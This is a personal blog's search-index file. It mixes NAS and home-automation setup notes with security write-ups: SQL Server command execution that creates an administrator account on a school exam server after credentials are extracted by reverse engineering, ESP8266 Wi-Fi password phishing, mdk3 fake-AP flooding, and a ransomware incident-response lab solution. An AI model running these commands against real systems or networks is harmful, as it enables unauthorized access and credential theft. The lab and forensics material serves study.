@@ -1,0 +1,623 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>入门OD打开逆向世界大门之日穿我校某考试系统软件</title>
+    <url>/2021/11/09/OllydbgStudy/</url>
+    <content><![CDATA[前言这学期上数据库课用到了我校某老师自己开发的一个考试系统软件，然后在一次小测中这垃圾系统我语句明明就是对的，可它编译就一直报错说我语法错误，实在受不了那就来盘一下他（授权测试的，用户在测试成功后已删除。
+注：此文章仅限于安全研究，违法犯罪与作者无关！
+逆向分析将程序载入OD这个程序是加了一个ASPack的壳子，直接用ESP定律找到OEP
+
+F9运行到了OEP附近，走过这个retn
+
+现在就来到了OEP（如果你的OD显示的都是db的话用右键-&gt;分析-&gt;从模块中删除目标扫描），然后删掉之前下的硬件断点
+
+然后继续单步……（balabala
+或者我们直接利用工具将它脱壳然后将其导入，右键-&gt;中文搜索引擎-&gt;智能搜索
+
+接着搜索字符串password&#x3D;我们的目的是找数据库的连接信息
+
+然后跟随过去后在段首下一个断点
+
+F9运行程序，发现程序已经段下来了，右边的寄存器窗口中显示的就是连接信息，但不全面
+
+继续F8单步，运行到我们找到的 password= 附近的call，看到堆栈窗口中已经完全显示了连接信息
+
+渗透提权得到账号密码后，我们就开始sqlserver连接到服务器
+
+这里我们是可以调用cmd执行命令的，whoami 发现是 system
+declare @shell intexec sp_oacreate &#x27;wscript.shell&#x27;,@shell outputexec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\log.txt&#x27; create table tmp_text (lines nvarchar(1000))bulk insert tmp_text from N&#x27;C:\log.txt&#x27;select * from tmp_textdrop table tmp_text
+
+
+于是我们就开始增加用户并给新建的账号管理员权限
+declare @shell intexec sp_oacreate &#x27;wscript.shell&#x27;,@shell outputexec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net user 用户名 密码 /add &gt;c:\log.txt&#x27; declare @shell intexec sp_oacreate &#x27;wscript.shell&#x27;,@shell outputexec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators 用户名 /add &gt;c:\log.txt&#x27; create table tmp_text (lines nvarchar(1000))bulk insert tmp_text from N&#x27;C:\log.txt&#x27;select * from tmp_textdrop table tmp_text
+
+最后mstsc成功连上
+
+]]></content>
+      <categories>
+        <category>红队笔记</category>
+      </categories>
+      <tags>
+        <tag>Ollydbg</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>esp8266钓鱼获取指定WiFi密码</title>
+    <url>/2022/08/10/esp8266towifi/</url>
+    <content><![CDATA[前言前段时间收拾东西在以前瞎捣鼓的智能灯上把esp8266拆了下来，想着拿来研究无线电这块的知识，然后发现了一篇 用ESP8266无线模块进行钓鱼渗透测试 的文章，接下来就来复现一下吧
+
+准备工作硬件方面：esp8266 无线模块（我的和作者一样是块esp01）、USB 转 TTL 烧录器
+软件方面：ESP8266Flasher - nodemcu、XCOM串口调试助手、作者更新的固件
+链接：https://pan.baidu.com/s/1NiO9Ty_zDIvia-IgOtqrxw提取码：qkck
+
+烧录将我们的esp8266-01与烧录器连接然后插入电脑上，接着打开设备管理器找到 cp210x 这个端口
+
+接着我们打开nodemcu，在operation模块下选择com6端口
+
+然后在config模块下，输入固件路径，烧录地址 0x00000
+
+最后回到operation模块，点击 flash 开始烧录，当出现绿勾则说明烧录成功，如果烧录失败请擦除 flash 后重试（本人暂无出现失败情况
+
+测试
+wifi名称FishAP，密码：gkdamm666 后台：http://192.168.0.1/backdoor.html
+
+首先我们需要连接FishAP这个WiFi，然后访问后台，等待一会让模块扫描出附近的WiFi（PS：如果找不到FishAP这个WiFi，就重启模块
+
+接着勾选通用型，填写编号（编号就是列表最前面的那个数字，需要找到你所指定WiFi对应的编号
+
+没显示加密的那个就是我们的钓鱼WiFi
+
+灯亮表示在钓鱼，钓到密码以后灯灭，WiFi列表重新出现fishap，连接上打开后台即可看到密码
+
+总结建议别用esp8266-01进行钓鱼，它更适用于做WiFi杀手。其一是因为其性能低，加载钓鱼界面很久。其二，它的信号范围极小，别人很难扫描到。最好还是用加大功率的无线网卡配合fluxion等开源钓鱼项目
+]]></content>
+      <categories>
+        <category>研究随笔</category>
+      </categories>
+      <tags>
+        <tag>esp8266</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>年轻人的第一台NAS</title>
+    <url>/2023/02/25/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E5%8F%B0NAS/</url>
+    <content><![CDATA[准备工作需要购置的零件有机箱（可以自己单独购买电源）、主板、内存条、硬盘
+1.机箱这里我买的是拓普龙6盘位NAS服务器机箱，不过不建议买6口的（贼难装，难怪没啥人买这款，早知道就不贪便宜直接买个8口的机箱要好装多了🤔）
+
+开箱如下，还不错的一点就是给配了一大包螺丝😘但是没分开来包装不好找要用的
+
+
+2.电源这里电源我是单独购买的台达150W电源（他喵的~我买的时候还需要12块运费，现在就变免运费啦🤡
+
+开箱如下，一块电源以及一根电源线
+
+3.主板主板我选的是映泰j4125，买的时候涨价了好贵~ 于是我选择了pdd购买能便宜挺多的
+
+
+4.内存条内存要求就不是很高了，随便买个4G的就行，不过有点需要注意的是颗粒数量，一定得买4颗粒的，商家一般都不会写出来所以比较坑
+
+如果不是4颗粒的，测试的时候就会出现如下问题，毫无反应（我这个内存应该拆开是8颗粒的😣以及这里U盘是要插在后面主板上的）
+
+5.硬盘这里我选的是海康威视的监控硬盘，两块4T的大概就花了七百块，依旧还是上pdd采购节省开销
+
+安装过程其实nas说好装也好装，说不好装也不好装😂就是一个萝卜一个坑
+先把电源根据机箱的结构固定到对应位置，再把电源上的线装好（这里想喷一下它这里接线可困难了，后板焊住了不能拆开，并且和sata线混在一块，可以说毫无发力点），这里我没有装扩展卡就只用到两根sata线，所以风扇也就没必要插上，需要注意的是硬盘线一定得按顺序接上并记住它
+
+然后就是主板了，先把我们要用到的两跟sata线按主板上写的1、2对应装上，再找到usb线和电源线找到对应位置装上，以及4pin、24pin线，内存条，然后根据机箱结构装上主板。这里想喷一下主板那里的螺丝孔特别歪，后面手被割了好几个口才勉强固定住（下图内存还没插上就是因为它翻车）
+
+组装好后不着急把壳装上，需要测试一下能不能用，先插上显示屏的HDMI线和装好pe的U盘，再插上电源线，效果如下：
+
+亮起来一般就没啥问题了，最后成功进入pe就可以装上了
+
+最后关机，把硬盘装好插上即可开始nas之旅😁
+
+]]></content>
+      <categories>
+        <category>折腾实录</category>
+      </categories>
+      <tags>
+        <tag>NAS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DDNS GO实现动态解析</title>
+    <url>/2023/03/04/NAS-DDNSGO/</url>
+    <content><![CDATA[首先到套件中心安装ddns-go
+
+接着打开ddns-go后填写ID、token和Domains的信息即可，腾讯云的话可以直接点击创建密钥来生成ID和token
+
+具体可参考文章：https://cloud.tencent.com/developer/article/1921363
+
+
+
+然后回到nas的控制面板里直接去搜索一下证书找到位置进行新增证书
+
+
+
+然后去之前申请证书的dnspod中下载证书文件，这里选择nginx
+
+将下载的证书文件导入即可
+
+]]></content>
+      <categories>
+        <category>折腾实录</category>
+      </categories>
+      <tags>
+        <tag>NAS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NAS后续-安装黑群晖</title>
+    <url>/2023/02/27/NAS%E5%90%8E%E7%BB%AD-%E5%AE%89%E8%A3%85%E9%BB%91%E7%BE%A4%E6%99%96/</url>
+    <content><![CDATA[首先上GitHub找到arpl，下载这个img的文件（这个格式是通用的，可供物理机也可供虚拟机使用）
+
+接着解压得到img文件，利用图吧工具箱中的Rufus将其刷到U盘里
+
+然后把刷好的U盘放到NAS主机上，开机进BIOS设置从U盘启动（一般是默认好的），确认无误后点击save&amp;exit进行重启
+
+当编译系统出现如下页面时就表示已经启动好了，我们需要记下编译系统的IP地址（这里我们路由器开了DHCP，系统会自动去获取IP地址，记得插上网线哦）
+
+在同一局域网下，使用另外一台电脑的浏览器打开编译系统显示的IP地址和端口，会显示以下界面，在Choose a model处回车显示出本机可编译黑群晖的型号
+
+这里我们选的是DS920+，用方向键选好以后按回车键
+
+接下来在Choose a Build Number处回车
+
+选择我们想要编译的黑群晖版本，这里我们选择的是最新的7.1.1-42962版本
+
+
+在Choose a serial number处回车
+
+接着在Generate a random serial number处回车，编译系统会随机生成一个序列号
+
+在Addons处回车（如果使用的CPU不是10代，此处操作直接跳过）
+
+再点击Add an addons处回车
+
+在Intel iGPU Drivers(10th Gen)处回车，加载十代CPU核显驱动
+
+这里直接回车即可，无需等待它
+
+加载好驱动后，查看Add an addons处发现10th已经不见了即说明添加上了，再在Exit处回车返回上级菜单
+
+在Build the loader处回车，开始编译
+
+这里就只是编译boot文件，所以不挂代理也能快速完成编译
+
+引导编译完成后，系统会自动跳回这个界面，并且会多出一行菜单Boot the loder，点击回车，把NAS主机手动重启一次，编译好的引导就会自动启动
+
+该项目编译出来的引导启动后显示的界面如下，会显示系统型号、系统版本等
+
+然后直接访问IP或者5000端口即可看到
+
+再去官网下载一下pat镜像包并将其上传
+
+
+开始安装系统
+
+装好后会重启一下，可能需要等待一段时间
+
+
+等待一会即可
+
+点击开始
+
+填写一下自己的设备名以及账号密码，然后不要去勾选那个，填完直接下一步就行
+
+这里我们是黑群晖就不要去选它推荐的自动安装，应该去选手动安装
+
+选择跳过
+
+勾选并提交
+
+至此，我们就完成了黑群晖的安装🎉
+
+进来后先跟着提示创建存储，这里我们选择RAID1再下一步
+
+将两块硬盘都选上再下一步
+
+勾选执行硬盘检查再下一步
+
+点击最大化后下一步
+
+选择推荐的Btrfs再下一步
+
+确认无误后应用即可
+
+大功告成，上床睡大觉啦😁
+
+后续像这里可以用邮箱启用等操作都还待研究🤔
+
+]]></content>
+      <categories>
+        <category>折腾实录</category>
+      </categories>
+      <tags>
+        <tag>NAS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅记米家电脑开机卡的安装</title>
+    <url>/2023/02/12/%E6%B5%85%E8%AE%B0%E7%B1%B3%E5%AE%B6%E7%94%B5%E8%84%91%E5%BC%80%E6%9C%BA%E5%8D%A1%E7%9A%84%E5%AE%89%E8%A3%85/</url>
+    <content><![CDATA[准备工作简单的记录一下利用米家电脑开机卡配合小爱音响实现语言控制开关机
+我们只需要购置个最便宜的米家mesh开机卡mini版即可（当然电脑和小爱音响这边已经有了🤣）
+
+
+
+安装过程步入正题，拆开自己的电脑，断开电源并将开机卡插到主板对应位置
+下面以我的主板为例，需要插拔的地方就是如下两处
+
+找到自己主板上PCIEX1口和插着POWER SW线的位置（上图更清晰一些），先将主板上的POWER SW线拔下来，插入到开机卡上空着的引脚上，再将开机卡上的那根POWER SW线插入到主板上（也可以看下图操作）
+
+这里拔的时候很容易将其他的线也拔下来，所以我们根据下图所示，依次将POWER SW线(右上角)、POWER LED线(左上角，+左-右)、HDDLED线(左下角)、RESET SW线(右下角)（这里的位置是面向自己，上四下五，插的时候有字的一面朝向自己的方向插入）
+
+最后将显卡啥的都装好后开启电源，手机就会弹出一个情景Mesh通断器TM系列并将其添加至米家，可以看到这里设备是离线的
+
+点进去看到好像是什么蓝牙直连的，于是打开蓝牙确实有个Mesh Ali_Mi Light的蓝牙设备
+
+但是连接后并没有解决设备离线的问题，想起前面小爱音箱好像没开启mesh网关，于是下了个小爱音箱APP登录后打开蓝牙Mesh发现确实没开启，连上后还是没能成功连上设备
+
+
+于是拆开电脑重新插一下开机卡，让它断电（相当于重置开机卡的flash），再打开米家就显示正常了成功撒花🎉
+
+不过这里我高兴的也太早了，尝试语音打开电脑会发现小爱音箱正常回复开了，电脑也亮了，但是就进不去系统（难道是在自检？再等等……TMD十几分钟过去他还是暗着的），然后打开米家进入设备点击开关机也毫无反应，按重启键再仔细观察发现连华硕的那个标志都没出现过
+
+后面再次尝试会发现它开始出现华硕的标志，但是一闪而过，再次尝试发现它还能进系统了，但是刚看到桌面它就自己关机了
+这里应该就是小米的bug（不愧是小米的模组，客服的回答也是让我一头雾水看不懂他要表达什么），需要前往米家，关闭点动模式
+
+再打开通电后默认状态，选择修复断电前状态
+
+最后再来试试（先稳妥点打开米家手工点击开启进入系统后再进行语音控制）发现成功了！
+]]></content>
+      <categories>
+        <category>折腾实录</category>
+      </categories>
+      <tags>
+        <tag>米家电脑开机卡</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次生成虚假WiFi</title>
+    <url>/2022/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%9F%E6%88%90%E8%99%9A%E5%81%87WiFi/</url>
+    <content><![CDATA[前期准备kali + 无线网卡
+操作过程首先我们需要装一下mkd3
+sudo apt-get install mdk3
+
+接着连下我们的无线网卡
+
+然后我们 iwconfig 查看下是否真的连上
+
+添加mon0
+iw wlan0 interface add mon0 type monitoriwconfig 检测一下是否成功
+
+
+填写WiFi名字
+vi wifi.lst输入i进行编辑（如果你不知道的话我给你提醒一下输入你想要取的WiFi名字Ctrl+C 然后 :wq或者:x实现保存并退出（如果你不知道的话我给你提醒一下
+
+
+最后生成WiFi
+mdk3 mon0 b -f wifi.lst
+
+
+]]></content>
+      <categories>
+        <category>研究随笔</category>
+      </categories>
+      <tags>
+        <tag>fakewifi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulntarget-n</title>
+    <url>/2024/11/16/vulntarget-n/</url>
+    <content><![CDATA[前言在面对勒索病毒这样的网络威胁时，我们不能被动等待，而要积极应对。我们需要了解攻击的原理和过程，熟练掌握应急响应和取证分析的技术，以便在面对真实的威胁时能够迅速有效地应对。
+vulntarget-n是一个模拟全球化勒索病毒高发环境下的应急响应和取证分析案例，其模拟了一个正常运行的业务服务被勒索病毒攻击的情景：
+
+客户在阿里云部署的业务环境
+今天突然发现首页变成了一个勒索的界面，要求用户支付赎金以解密数据
+客户发现其中部分重要文件被加密为.vulntarget结尾
+
+
+随即客户要你进行应急响应并取证分析，因为是阿里云的ECS，客户将阿里云ECS实例镜像导出到本地，要求你在明天分析出结果。
+具体要求如下：
+
+分析攻击事件是如何发生的，请给出攻击画像
+解密勒索
+恢复原来的index.jsp页面，恢复正常的web服务
+找到隐藏在其中的3个flag
+
+已知服务器系统为Ubuntu20.04，账号密码： 账号：root 密码：Vulntarget@123
+ps：在本次靶场设计中少了一次反弹shell的操作，主要是防止设计者的ip出现泄露，在攻击路径描述中可以直接把反弹shell的步骤加上即可。
+准备工作解压完是个raw文件，VMware无法直接打开
+
+可利用qemu工具转换为vmdk格式
+工具下载地址：https://qemu.weilnetz.de/w64/转换命令：qemu-img.exe convert -f raw -O vmdk vuln_m-j6cegcrhehdcba0r5h4v_system.raw vulntarget-n.vmdk
+
+
+然后新建虚拟机，稍后安装操作系统，选择磁盘为使用现有虚拟磁盘，保持现有格式即可
+
+
+应急响应首先查询特权用户特权用户等情况，未发现异常账号
+
+然后检查是否存在异常端口、进程、开机启动项等，但也未发现异常
+
+接着，再来查看历史命令发现flag：flag{vulntarget_very_G00d}
+root@iZj6c6hytildlalnu0cwt4Z:~# cat .bash_history    1  apt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -y    2  vim /etc/profile    3  source /etc/profile    4  wget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zip    5  unzip apache-tomcat-7.0.79.zip    6  mv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcat    7  mv apache-tomcat-7.0.79 /opt/tomcat    8  chmod +x /opt/tomcat/bin/*.sh    9  ls   10  history    11  flag&#123;vulntarget_very_G00d&#125;   12  /opt/tomcat/bin/startup.sh   13  cp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bak   14  vim /opt/tomcat/conf/server.xml   15  ps -axu | grep tomcat   16  kill -9 6961   17  /opt/tomcat/bin/startup.sh   18  cp web.xml web.xml.bak   19  pwd    20  cd ..   21  ls   22  cd /opt/   23  ls   24  cd tomcat/   25  ls   26  cd conf/   27  cp web.xml web.xml.bak   28  vim web.xml   29  ps -axu | grep tomcat   30  kill -9 7409   31  /opt/tomcat/bin/startup.sh   32  pwd    33  cd ..   34  ls   35  cd webapps/   36  ls   37  cd ROOT/   38  ls   39  rm favicon.ico    40  cp index.jsp index.jsp.bak   41  ls   42  vim index.jsp   43  rm index.jsp   44  vim index.jsp   45  crontab -e   46  history    47  ls   48  mv vulntargetn.jsp 404.jsp   49  ls   50  rm index.jsp.bak   51  pip3 install rsa   52  ls   53  ls -lha   54  mkdir .vulntarget   55  cd .vulntarget/   56  ls   57  mkdir keys   58  ls   59  history    60  ls   61  vim get_pem.py   62  python3 get_pem.py    63  ls   64  rm get_pem.py    65  ls   66  cd ..   67  ls   68  cp .vulntarget/keys/pubkey.pem .   69  ls   70  ls | grep jsp   71  vim encrypt_vulntarget.py   72  ls   73  vim flag.jsp   74  ls | grep jsp   75  python3 encrypt_vulntarget.py    76  ls   77  cd .vulntarget/   78  ls   79  cd keys/   80  ls   81  cat pubkey.pem    82  cat privkey.pem    83  cd ..   84  ls   85  cd ..   86  ls   87  rm encrypt_vulntarget.py    88  rm pubkey.pem    89  ls   90  vim index.jsp   91  ls   92  cd ..   93  ls   94  cd ..   95  ls   96  cd logs/   97  ls   98  cat localhost_access_log.2024-06-04.txt    99  vim localhost_access_log.2024-06-04.txt   100  ls  101  vim localhost_access_log.2024-06-04.txt   102  ls  103  history   104  curl http://127.0.0.1  105  ls  106  cd   107  ls  108  ls -lha  109  cat .bashrc   110  ls  111  history &gt; .bash_historyapt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -yvim /etc/profilesource /etc/profilewget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zipunzip apache-tomcat-7.0.79.zipmv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcatchmod +x /opt/tomcat/bin/*.shlshistory flag&#123;vulntarget_very_G00d&#125;/opt/tomcat/bin/startup.shcp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bakvim /opt/tomcat/conf/server.xmlps -axu | grep tomcatkill -9 6961/opt/tomcat/bin/startup.shcp web.xml web.xml.bakpwd cd ..lscd /opt/lscd tomcat/lscd conf/cp web.xml web.xml.bakvim web.xmlps -axu | grep tomcatkill -9 7409/opt/tomcat/bin/startup.shpwd cd ..lscd webapps/lscd ROOT/lsrm favicon.ico cp index.jsp index.jsp.baklsvim index.jsprm index.jspvim index.jspcrontab -ehistory lsmv vulntargetn.jsp 404.jsplsrm index.jsp.bakpip3 install rsalsls -lhamkdir .vulntargetcd .vulntarget/lsmkdir keyslshistory lsvim get_pem.pypython3 get_pem.py lsrm get_pem.py lscd ..lscp .vulntarget/keys/pubkey.pem .lsls | grep jspvim encrypt_vulntarget.pylsvim flag.jspls | grep jsppython3 encrypt_vulntarget.py lscd .vulntarget/lscd keys/lscat pubkey.pem cat privkey.pem cd ..lscd ..lsrm encrypt_vulntarget.py rm pubkey.pem lsvim index.jsplscd ..lscd ..lscd logs/lscat localhost_access_log.2024-06-04.txt vim localhost_access_log.2024-06-04.txt lsvim localhost_access_log.2024-06-04.txt lshistory curl http://127.0.0.1lscd lsls -lhacat .bashrc lshistory &gt; .bash_historyhistory exit
+
+
+分析这些敏感历史命令发现攻击者可能将webshell写入到tomcat目录下，同时还发现了攻击者创建隐藏目录.vulntarget，并且编写运行get_pem.py和encrypt_vulntarget.py这两个rsa加密脚本来生成加密密钥对并加密
+根据历史命令来查看tomcat日志localhost_access_log.2024-06-04.txt，可知是tomcat PUT文件上传
+
+并且得到flag：flag{Welcome_t0_join_Us}
+
+进入tomcat的web目录下发现一共加密了4个文件
+root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/404.jsp.vulntarget N/nNQJJ60jZ6WvLltQK5U6+jKQ0HicpJW2gGt8YbxWqZxE+k4KyIpaDZCicGRsOHAuo+hYuLLX1wRDLt7BDvfnPdqeI/XMiGsL7nkx2Hc5FwD/MJrZYy0i5bzQvg955W6YiI8KKcfpeYI0+aZMuP7tP9duuiu+YHvmnD/1Wq0n1r/fEhWoSnZyAm5Gcc9AjpCPQQI3yF1APbDyHywCW64kOmN+kd/B5cLi62zfxgYnfUff31gtHf+G0FgHFEB0bze+epyKfBumuDGklzKajtJm79fGqlwjh26sPz6jUR1k54h6jDqM15qZKbD3z7E37k3IPpfjspTWwKchmHB6oMmEfLSXGvI4ECNb9KIVxjUADSO8oYZpNaNJmOKF4x/GndhCK++jPOHhZywhjhDHthqH+yLQGsN2+KiLqBJp8RyP8dFXbANgp+agls4cMfVTgEfQzjkJKtELBzmQoskB+WdUk9v0vczio4d//nGXeWm1eRDbL5BhQQuo2cTEFBA9aDC8mJtFCqxafLoVeWxjYac8r+0iXPIfPklpcxqDwdTam5n7GlNOeJZgFwrmuREyTQ+iGijTzIcX4eqPTTowdi+GpLTXGF1XSESl9g/OLRKrai+DVM3AoQ8fOR5DSS6b8RZvPjKNoqXpS4jSn02w7GXz3SdJcqbZwRdQ/lS712S5g=root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/flag.jsp.vulntarget Au+XkLqSjNieysLjjYxz9/XKnZ0l5iyhvBi4/zXw7LBBD/LykamEm5MrEIboYoL/zYE+AhvCf2a84e9ApJxsBrzcwCLSxv77dbkqzLy9+W127e1k0iz+1SM60W2315Yq1aYeEWcznVrzY9qrjtv/eXXOVEMUHONm3VLCs3mHDc0=root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/index.jsp.vulntarget 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root@iZj6c6hytildlalnu0cwt4Z:~# cat /opt/tomcat/webapps/ROOT/vulntarget.jsp.vulntarget goH93IcI5UeCpubU5frhuBhnmDcKEXVyE0i7yE07yyuHTVwnhRq8u44y2EbZiH77amDZrn+mWvhohGKC4is9mrjh2Fj7QuMSe5mqi9zSM4UhmIF+H8PjcYJny3KPoLko8kl+8tNMZxYiAtl9RIJ3cdXMLDPxyP6Mq42jisW2K+o=
+
+
+历史命令中搜索.pem文件，找到私钥文件
+
+从而解密得到flag：flag{https://github.com/crow821/vulntarget}
+from cryptography.hazmat.primitives import serialization, hashesfrom cryptography.hazmat.primitives.asymmetric import paddingfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives import hashesfrom cryptography.hazmat.primitives.asymmetric import rsafrom base64 import b64decode# 读取公钥和私钥文件with open(&#x27;privkey.pem&#x27;, &#x27;rb&#x27;) as key_file:    private_key = serialization.load_pem_private_key(        key_file.read(),        password=None,    )# 读取密文encrypted_flag = b64decode(&#x27;Au+XkLqSjNieysLjjYxz9/XKnZ0l5iyhvBi4/zXw7LBBD/LykamEm5MrEIboYoL/zYE+AhvCf2a84e9ApJxsBrzcwCLSxv77dbkqzLy9+W127e1k0iz+1SM60W2315Yq1aYeEWcznVrzY9qrjtv/eXXOVEMUHONm3VLCs3mHDc0=&#x27;)# 解密密文decrypted_flag = private_key.decrypt(    encrypted_flag,    padding.PKCS1v15()  # 使用PKCS#1 v1.5 padding)print(f&quot;&#123;decrypted_flag.decode(&#x27;utf-8&#x27;)&#125;&quot;)
+
+
+漏洞复现直接PUT方式上传文件发现不修改后缀名上传失败了
+
+在后面加个/验证上传成功，至此即可确认入口点为Tomcat PUT任意文件上传漏洞
+
+业务恢复由于网站首页也被修改了，还需要解密前面的index.jsp.vulntarget
+
+用之前的脚本会发现报错长度不一致
+
+后面利用在线工具解密成功
